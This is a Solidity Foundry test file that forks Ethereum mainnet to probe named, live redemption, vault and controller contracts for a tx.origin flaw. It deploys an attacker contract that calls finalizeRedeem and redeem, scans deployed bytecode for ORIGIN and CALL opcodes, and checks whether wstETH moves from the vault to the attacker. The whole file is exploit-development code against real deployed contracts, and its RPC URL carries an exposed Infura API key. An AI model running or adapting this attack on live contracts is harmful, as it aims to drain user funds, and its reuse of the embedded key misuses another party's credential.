// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

// Attacker contract that calls REDEMPTION via another call
contract TxOriginAttacker {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function attack() external {
        // If finalizeRedeem uses tx.origin as recipient,
        // this will send wstETH to tx.origin (the EOA that started the tx)
        (bool success,) = REDEMPTION_0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        require(success, "Attack failed");
    }

    function attackRC() external {
        // Try to call RC directly
        (bool success,) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, owner)
        );
        require(success, "RC attack failed");
    }

    // Fallback to receive wstETH or ETH
    fallback() external payable {}
    receive() external payable {}
}

contract TxOriginExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;

    // RC delegatecall target found earlier
    address constant RC_DELEGATE_TARGET = 0x5822122092FDBCdc29f1ce2EB5f8f45Bb7dF3a05;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;
    TxOriginAttacker attackerContract;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);

        vm.prank(attacker);
        attackerContract = new TxOriginAttacker();
    }

    function test_InvestigateTxOriginUsage() public view {
        console.log("=== INVESTIGATING TX.ORIGIN USAGE ===\n");

        bytes memory code = REDEMPTION_0.code;

        // Find ORIGIN opcode and context
        console.log("ORIGIN (0x32) locations in REDEMPTION_0:");
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0x32) {
                console.log("\n  ORIGIN at:", i);

                // Check what happens after ORIGIN
                console.log("  Following opcodes:");
                for (uint j = i + 1; j < i + 20 && j < code.length; j++) {
                    uint8 op = uint8(code[j]);
                    if (op == 0x14) console.log("    ", j, "EQ");
                    else if (op == 0x52) console.log("    ", j, "MSTORE");
                    else if (op == 0x56) console.log("    ", j, "JUMP");
                    else if (op == 0x57) console.log("    ", j, "JUMPI");
                    else if (op == 0xf1) console.log("    ", j, "CALL");
                    else if (op == 0xf4) console.log("    ", j, "DELEGATECALL");
                    else if (op == 0x16) console.log("    ", j, "AND");
                    else if (op == 0x33) console.log("    ", j, "CALLER");
                }
            }
        }
    }

    function test_InvestigateRCDelegateTarget() public view {
        console.log("=== INVESTIGATING RC DELEGATE TARGET ===\n");

        console.log("RC_DELEGATE_TARGET:", RC_DELEGATE_TARGET);
        console.log("Code size:", RC_DELEGATE_TARGET.code.length);

        if (RC_DELEGATE_TARGET.code.length > 0) {
            bytes memory code = RC_DELEGATE_TARGET.code;

            // Find function selectors
            console.log("\nFunction selectors:");
            for (uint i = 0; i + 4 < code.length && i < 500; i++) {
                if (uint8(code[i]) == 0x63) {
                    bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                    if (sel != 0xffffffff) {
                        console.logBytes4(sel);
                    }
                }
            }

            // Check storage
            console.log("\nStorage slots:");
            for (uint i = 0; i < 5; i++) {
                bytes32 slot = vm.load(RC_DELEGATE_TARGET, bytes32(i));
                if (slot != bytes32(0)) {
                    console.log("  Slot", i, ":");
                    console.logBytes32(slot);
                }
            }
        } else {
            console.log("No code at address (might be EOA or not deployed)");
        }
    }

    function test_TryViaTxOriginContract() public {
        console.log("=== TRYING VIA TX.ORIGIN CONTRACT ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerBefore = IERC20(wstETH).balanceOf(attacker);
        console.log("Vault wstETH before:", vaultBefore / 1e18);
        console.log("Attacker wstETH before:", attackerBefore / 1e18);

        deal(IAU, attacker, 100000e18);

        // Attacker creates a redemption request (if possible)
        vm.startPrank(attacker);
        IERC20(IAU).approve(REDEMPTION_0, type(uint256).max);

        // First try to create redemption
        (bool s1, bytes memory d1) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", uint96(100e18))
        );
        console.log("\nredeem success:", s1);
        if (!s1 && d1.length >= 4) {
            console.log("  Error:");
            console.logBytes4(bytes4(d1));
        }

        // Warp time
        vm.warp(block.timestamp + 8 days);

        // Try finalizing via attacker contract (tx.origin = attacker EOA)
        console.log("\nTrying via attacker contract...");
        try attackerContract.attack() {
            console.log("Attack succeeded!");
        } catch {
            console.log("Attack failed");
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        uint256 attackerAfter = IERC20(wstETH).balanceOf(attacker);

        console.log("\nVault wstETH after:", vaultAfter / 1e18);
        console.log("Attacker wstETH after:", attackerAfter / 1e18);

        if (attackerAfter > attackerBefore) {
            console.log("\n*** TX.ORIGIN EXPLOIT WORKED! ***");
        }
    }

    function test_CheckRedemptionMsgSenderVsTxOrigin() public view {
        console.log("=== CHECKING MSG.SENDER VS TX.ORIGIN IN REDEMPTION ===\n");

        bytes memory code = REDEMPTION_0.code;

        // Count CALLER (msg.sender) vs ORIGIN (tx.origin)
        uint callerCount = 0;
        uint originCount = 0;

        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0x33) callerCount++;
            if (uint8(code[i]) == 0x32) originCount++;
        }

        console.log("CALLER (msg.sender) count:", callerCount);
        console.log("ORIGIN (tx.origin) count:", originCount);

        // If tx.origin is used for authorization or recipient, we might have an exploit
    }

    function test_AnalyzeWhereOriginIsUsed() public view {
        console.log("=== ANALYZING WHERE ORIGIN IS USED ===\n");

        bytes memory code = REDEMPTION_0.code;

        // The ORIGIN at 8987 might be near finalizeRedeem or RC.redeem call
        // Let's see what's around it

        if (code.length > 8987) {
            console.log("Bytecode around ORIGIN at 8987:");
            uint start = 8970;
            uint end = 9020;

            for (uint i = start; i < end && i < code.length; i++) {
                uint8 op = uint8(code[i]);

                if (op == 0x32) console.log(i, "ORIGIN");
                else if (op == 0x33) console.log(i, "CALLER");
                else if (op == 0x54) console.log(i, "SLOAD");
                else if (op == 0xf1) console.log(i, "CALL");
                else if (op == 0xf4) console.log(i, "DELEGATECALL");
                else if (op == 0x52) console.log(i, "MSTORE");
                else if (op == 0x51) console.log(i, "MLOAD");
                else if (op == 0x14) console.log(i, "EQ");
                else if (op >= 0x60 && op <= 0x7f) {
                    uint8 size = op - 0x5f;
                    if (size <= 4 && i + size < code.length) {
                        uint256 val = 0;
                        for (uint j = 0; j < size; j++) {
                            val = val << 8 | uint8(code[i + 1 + j]);
                        }
                        console.log(i, "PUSH size:");
                        console.log("  ", size, "val:", val);
                    }
                }
            }
        }
    }

    function test_TraceFinalizeRedeemToRCCall() public view {
        console.log("=== TRACING FINALIZEREDEEM TO RC.REDEEM ===\n");

        // We know:
        // - finalizeRedeem at selector 0xaff6cbf1
        // - It should call RC.redeem(amount, to)
        // - The 'to' parameter is what we want to control

        // The question is: how is 'to' determined?
        // 1. Is it msg.sender?
        // 2. Is it tx.origin?
        // 3. Is it stored in the redemption request?
        // 4. Is it hardcoded?

        bytes memory code = REDEMPTION_0.code;

        // Find the RC address in bytecode (should be near a CALL)
        bytes memory rcBytes = abi.encodePacked(REDEMPTION_CONTROLLER);

        console.log("Searching for RC address in REDEMPTION_0:");
        for (uint i = 0; i + 20 < code.length; i++) {
            bool match_ = true;
            for (uint j = 0; j < 20; j++) {
                if (code[i + j] != rcBytes[j]) {
                    match_ = false;
                    break;
                }
            }
            if (match_) {
                console.log("  Found RC at offset:", i);

                // Look for CALL after this
                for (uint k = i; k < i + 100 && k < code.length; k++) {
                    if (uint8(code[k]) == 0xf1) {
                        console.log("    CALL at:", k);
                        break;
                    }
                }
            }
        }

        // Also check if RC is loaded from storage
        console.log("\nRC might be at storage slot. Checking...");

        // The RC address might be pushed via SLOAD
        // We need to find SLOAD followed by CALL
    }
}
